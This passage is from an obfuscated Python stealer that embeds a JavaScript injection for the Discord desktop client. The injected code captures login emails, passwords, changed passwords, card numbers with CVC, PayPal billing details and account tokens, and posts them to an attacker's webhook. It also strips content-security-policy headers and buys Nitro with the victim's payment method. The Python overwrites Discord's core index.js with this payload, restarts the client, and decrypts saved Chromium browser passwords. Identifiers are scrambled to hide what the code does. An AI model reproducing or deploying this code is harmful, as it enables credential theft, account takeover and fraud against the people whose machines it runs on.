          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def ZMMACAIPONUIUVJDFVVNIAOSOPXQWNBOLSXCZUZTVYUNKGNHFQGDUHSBELHWTDN():
    import os
    import re
    import subprocess
    import psutil

    def BQHBFLQSQEMTRYBLWIINNJCMENRRIYATVVGGEFXXLWKOCYAVHVZLBTXKTLBVZPIQBXBVVWTPHGZDZZS(NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP):
        for v4r_file in os.listdir(NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP):
            if re.search(r'app-+?', v4r_file):
                ATIWYOFFGUTVWFDARERFZFNYGXXUPYXUVUEXHJUSROXSFVTVZQTVDWTTJMMZYPZXUBOVXZPEREN = NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP + '\\' + v4r_file + '\\modules'
                if not os.path.exists(ATIWYOFFGUTVWFDARERFZFNYGXXUPYXUVUEXHJUSROXSFVTVZQTVDWTTJMMZYPZXUBOVXZPEREN):
                    continue
                for v4r_file in os.listdir(ATIWYOFFGUTVWFDARERFZFNYGXXUPYXUVUEXHJUSROXSFVTVZQTVDWTTJMMZYPZXUBOVXZPEREN):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT = ATIWYOFFGUTVWFDARERFZFNYGXXUPYXUVUEXHJUSROXSFVTVZQTVDWTTJMMZYPZXUBOVXZPEREN + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT, v4r_file
        return None

    def XKTKKUCIRIJPFOSOWBNFRYDPQXSXFZWAELZAUFPYLMSMHAGOOMJX(NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP):
        VMSOJFRMKLAVGEVYAFOSPHCCTKTXZBSAIAFBAGJXVUVLOBDWCYKXGQLRXLPTZTDYXRMIYA = NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP + '\\Update.exe'
        WQODOSJJQCBPGGALVYAPORDGNGEHULIELDQOXXHVLGVCLRHBSEGRFIPCEZMFGQFRTEOSXRPWJHDZLIGDKMFKUKZ = NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP):
            if re.search(r'app-+?', v4r_file):
                DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUE = NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP + '\\' + v4r_file
                if os.path.exists(DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUE + '\\' + 'modules'):
                    for v4r_file in os.listdir(DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUE):
                        if v4r_file == WQODOSJJQCBPGGALVYAPORDGNGEHULIELDQOXXHVLGVCLRHBSEGRFIPCEZMFGQFRTEOSXRPWJHDZLIGDKMFKUKZ:
                            WQODOSJJQCBPGGALVYAPORDGNGEHULIELDQOXXHVLGVCLRHBSEGRFIPCEZMFGQFRTEOSXRPWJHDZLIGDKMFKUKZ = DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUE + '\\' + WQODOSJJQCBPGGALVYAPORDGNGEHULIELDQOXXHVLGVCLRHBSEGRFIPCEZMFGQFRTEOSXRPWJHDZLIGDKMFKUKZ
                            subprocess.call([VMSOJFRMKLAVGEVYAFOSPHCCTKTXZBSAIAFBAGJXVUVLOBDWCYKXGQLRXLPTZTDYXRMIYA, '--processStart', WQODOSJJQCBPGGALVYAPORDGNGEHULIELDQOXXHVLGVCLRHBSEGRFIPCEZMFGQFRTEOSXRPWJHDZLIGDKMFKUKZ],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def AAXRUFJNCNTSQYWKKLRMMEDMQCJWUCABZONPDISLBDIZZGXCGVESLBYFJPAVKEIFWJXJITNAPOKBAFSBJUQGPADHM():
        DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUEdata = os.getenv('LOCALAPPDATA')
        HVQEXJQBHFNBZGEIYRPCMEMCIUONARZLQTCNSWUHGXSSJCCZSILAWNP = [
            DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUEdata + '\\Discord',
            DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUEdata + '\\DiscordCanary',
            DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUEdata + '\\DiscordPTB',
            DDOUUYHNBXWZULEDINBIFUJUOBUPYMNZCEMCRXVJYSWXIXHQXZEINCUHMMIFMVITPIPZUXZJUOMKSWKRFMLITYKSRUEdata + '\\DiscordDevelopment'
        ]
        PURNQYIMGWOKLNEPARSUPAKWAAOXLAFIUJELOOZNUETJSXALQRQJQ = JXVSKYLUOSINOJYUXCMLKIXJUGPTDSCBMBFQUECMEXCCDHZDFOSJUMMUBY

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP in HVQEXJQBHFNBZGEIYRPCMEMCIUONARZLQTCNSWUHGXSSJCCZSILAWNP:
            if not os.path.exists(NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP):
                continue

            OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT_info = BQHBFLQSQEMTRYBLWIINNJCMENRRIYATVVGGEFXXLWKOCYAVHVZLBTXKTLBVZPIQBXBVVWTPHGZDZZS(NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP)
            if OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT_info is not None:
                OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT, OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT_file = OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT_info
                
                DBXRCZMFRIODTFVBLZLZULCGYRIQCINPCKUJSSYSMVPIEXWNGCSCVJVDLLJXGIDQADWEYJVHBN = OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT + '\\index.js'
                
                if not os.path.exists(DBXRCZMFRIODTFVBLZLZULCGYRIQCINPCKUJSSYSMVPIEXWNGCSCVJVDLLJXGIDQADWEYJVHBN):
                    open(DBXRCZMFRIODTFVBLZLZULCGYRIQCINPCKUJSSYSMVPIEXWNGCSCVJVDLLJXGIDQADWEYJVHBN, 'w').close()

                with open(DBXRCZMFRIODTFVBLZLZULCGYRIQCINPCKUJSSYSMVPIEXWNGCSCVJVDLLJXGIDQADWEYJVHBN, 'w', encoding='utf-8') as f:
                    f.write((PURNQYIMGWOKLNEPARSUPAKWAAOXLAFIUJELOOZNUETJSXALQRQJQ).replace('discord_desktop_core-1', OJKBFBWTDQPYSAKHYCFHCPKVCOMFZYZLUKLFKKXAUSBTTTAQQFLDIGOAIYUURCOAOQURMITZBWOOFIUJSGLHNOT_file)
                            .replace(r"%WEBHOOK_HERE%", RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ)
                            .replace(r"%EMBED_COLOR%", str(EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW))
                            .replace(r"%USERNAME%", XOYHKLJCXKLVFJWTDZUNBZFVHSMTDQHZTXLYIEKHTAKTTYLFWPKVIOSAIZC)
                            .replace(r"%IP_PUBLIC%", EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR)
                            .replace(r"%EMBED_NAME%", BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS)
                            .replace(r"%EMBED_ICON%", HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)
                            .replace(r"%FOOTER_TEXT%", GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY)
                            .replace(r"%WEBSITE%", GGYBSNCVBTUYBNDFDGHQMRYTVCTGXVEAYKTUIZXFRWWKKWMHQWAQKTSJKFMAADATTKAEF))
                XKTKKUCIRIJPFOSOWBNFRYDPQXSXFZWAELZAUFPYLMSMHAGOOMJX(NFICOPLUBRHIEFPCETCWUYTFIXWWWNKWGGTAEIBJYFJMSNHFDSBUPSXDP)
    AAXRUFJNCNTSQYWKKLRMMEDMQCJWUCABZONPDISLBDIZZGXCGVESLBYFJPAVKEIFWJXJITNAPOKBAFSBJUQGPADHM()

def BPIYFHUVOHJYAMAERUTZRHVKVBULUOBOCQAHLLLZNUOLRLRVUZATHTSCYTWKVXCJSNGTFWBSLBVHKGNWWFFHNAQTFGBGKKDTIYDK():
    import os
    import io
    import zipfile
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from discord import SyncWebhook, Embed, File
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    STTZRJWCCHHUMBEJPIOXFBZXQFKZYGWSXQFSOBAZECYLFKRYIXM = []
    QVGZHDHJCLQSMHPOXYMRPYNZGXDCHPKICJCKKKDREFEBBWCXKVZ = []
    QTRZVXYQWKPXPUVIKJERWAVLQJSKXCHZLQZNSEIIFOJEUWPTYFHXUNWUCTMGGBZYN = []
    GYARZCWKUSOAFVXFATWAXQLHHMVLPUIKEDERKMQCCTXWIZPKXPSAWOXFVLCJRXWDBFGBVPJDMHHVVBOOXFDEZFQDEBBX = []
    RRZIMTMCXRZUOFBLMNJAJFRXLZEUXLBRBWOCAVDGDCQDVWVWQQCERIYRPUXCTCQSQNXWDQWENAZVOIWXGSPSNJVS = []
    BDTVTCMYZJLVNNQMMBIOZKKLHSOFVTAOATULGWDODMQUZDBJTYJIAGVCAKATQDTEATAGTVCNYKVSCPBBGBARKGVFNH = []

    def PEYRCWERMSKUSHMMZYUBELJTTRQVIXCXVCURJHKLNTZARHSAIQLYEMDYVMCGNCNKDRWT(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
        if not os.path.exists(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
            return None

        try:
            with open(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN, 'r', encoding='utf-8') as v4r_f:
                WICRGABGVMRDCNKWBCNHLLSYMFKOUNMFFHOMUBOXEZALBNSGQVDEAYLXBMAAPGGQOHCMLVMPA = json.load(v4r_f)

            UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_key = base64.b64decode(WICRGABGVMRDCNKWBCNHLLSYMFKOUNMFFHOMUBOXEZALBNSGQVDEAYLXBMAAPGGQOHCMLVMPA["os_crypt"]["encrypted_key"])[5:]
            EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS = win32crypt.CryptUnprotectData(UDPNPTHVJSLKUREYFFVZIRQJJRPNTDWXIVVKWFXYBLWSXDGFRCGRFSYSXXIILBTVHWTHVJKUVGIMGDHKLFRNBFQSCDHWPM_key, None, None, None, 0)[1]
            return EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS
        except:
            return None

    def RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTL(AKLDGWCZRLLISKXBOPPQOZXJSGCSZPFWHEKWXIEXAMWAAEKOVUHCDEQCNOMGHZZLRBVXDKDELANUKRUEVLRGEZ, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS):
        try:
            SGUWMJOBRUSBMKVJHRRQDFBSBHZBNALZYOYZBXBUXNNPJNNINHKGEHAZXEWFKIPBNLZSPUNUMBYOZRPPGOUBFBMSXZVMZ = AKLDGWCZRLLISKXBOPPQOZXJSGCSZPFWHEKWXIEXAMWAAEKOVUHCDEQCNOMGHZZLRBVXDKDELANUKRUEVLRGEZ[3:15]
            XYMGHHHVMCEPRJOKSRDGMCGSMUZBFRTOPHMLPMHIPOIWLDEWTEGDZPCKVIJ = AKLDGWCZRLLISKXBOPPQOZXJSGCSZPFWHEKWXIEXAMWAAEKOVUHCDEQCNOMGHZZLRBVXDKDELANUKRUEVLRGEZ[15:-16]
            UCUKKKEIJSHXEGMQKDBILPLMSTKFFFUGETBEXRFSXWSGULNEECGTCL = AKLDGWCZRLLISKXBOPPQOZXJSGCSZPFWHEKWXIEXAMWAAEKOVUHCDEQCNOMGHZZLRBVXDKDELANUKRUEVLRGEZ[-16:]
            CVSKSLNEDMPJYNODEATOMYXAHOKQGCDVPYSORBGRNIXWDSCPHRKMXSJUMXRZQUAFZETIYMLHINZPOBISVSIB = Cipher(algorithms.AES(EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS), modes.GCM(SGUWMJOBRUSBMKVJHRRQDFBSBHZBNALZYOYZBXBUXNNPJNNINHKGEHAZXEWFKIPBNLZSPUNUMBYOZRPPGOUBFBMSXZVMZ, UCUKKKEIJSHXEGMQKDBILPLMSTKFFFUGETBEXRFSXWSGULNEECGTCL))
            OZYLFDHGZMRSTXWWKCEAUNQYROFQMUWFQLERCOSIXCJDMZGHANA = CVSKSLNEDMPJYNODEATOMYXAHOKQGCDVPYSORBGRNIXWDSCPHRKMXSJUMXRZQUAFZETIYMLHINZPOBISVSIB.decryptor()
            VVCETVTQFJVMSVLOLMLUMLCBJSRAOXTSTMIDMGEMUCMKYDHFRJFHTPWJXXBNUGMLRKKXEBXCTSBZEJOTZFFQDQYCSBETKVLQVT = OZYLFDHGZMRSTXWWKCEAUNQYROFQMUWFQLERCOSIXCJDMZGHANA.update(XYMGHHHVMCEPRJOKSRDGMCGSMUZBFRTOPHMLPMHIPOIWLDEWTEGDZPCKVIJ) + OZYLFDHGZMRSTXWWKCEAUNQYROFQMUWFQLERCOSIXCJDMZGHANA.finalize()
            return VVCETVTQFJVMSVLOLMLUMLCBJSRAOXTSTMIDMGEMUCMKYDHFRJFHTPWJXXBNUGMLRKKXEBXCTSBZEJOTZFFQDQYCSBETKVLQVT.decode()
        except:
            return None
        
    def IXBBQNMJYASDASSAZKGODBDHSDBWOKONEJDJFRRGRWDRRKORGOAPYHTENSKHGGJGQSROLIUSTTQI(JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX, IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS):
        RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ_db = os.path.join(IPYSIXGMTHWATFPJUZYSIENXYMCUGFDKDTJBYLMNEECRRKHKGGEXVXYWWVQLZFYPYE, 'Login Data')
        if not os.path.exists(RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ_db):
            return

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ_db)
        disk_conn.backup(NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP)
        disk_conn.close()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO = NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.cursor()
        IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in IIIAJQKWJRUNUUNQVCBQEXFKKPUUTCQXDYJMYNZNFHFCCAIJRISHJIGO.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY =          f"- Url      : {v4r_row[0]}"
            TKXCNUONHWDNHYTPNJLVVGEIVMIMIJYMKCGPMIYYKJGWWTTIZLUSOFMTSSALQIPPGR =     f"  Username : {v4r_row[1]}"
            RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ =     f"  Password : {RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTL(v4r_row[2], EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS)}"
            JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name = f"  Browser  : {JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX}"
            STTZRJWCCHHUMBEJPIOXFBZXQFKZYGWSXQFSOBAZECYLFKRYIXM.append(f"{XSOSJXIZJQCRAYKJVOHUUHOGQEQIVKLNOEWMWJVYXCHAKEGYPDPXRASNQOXIXZALVRBWINCLJCIWIY}\n{TKXCNUONHWDNHYTPNJLVVGEIVMIMIJYMKCGPMIYYKJGWWTTIZLUSOFMTSSALQIPPGR}\n{RAASSOCTLHMQDUVFEYIOQFQSCLNVTVCJIWYQLACVBBHXDYXYQUKQQYPFPGQ}\n{JYZGYRJJKPTGUGZZMCDQYJWFMESELTINPVRMWWMKXXDGWFODQIMIMPXBJORKWXYLJBFBGYWHIDAGWNBVMWRTZPZRQLCLX_name}\n")

        NISBSFKDNKLCMQOEEMFZFBUKUUSLAGKPXQYZNHQVVTPIPCCVZBWVLPOYBWKHXWWELLQETACXYRPACXLOVP.close()

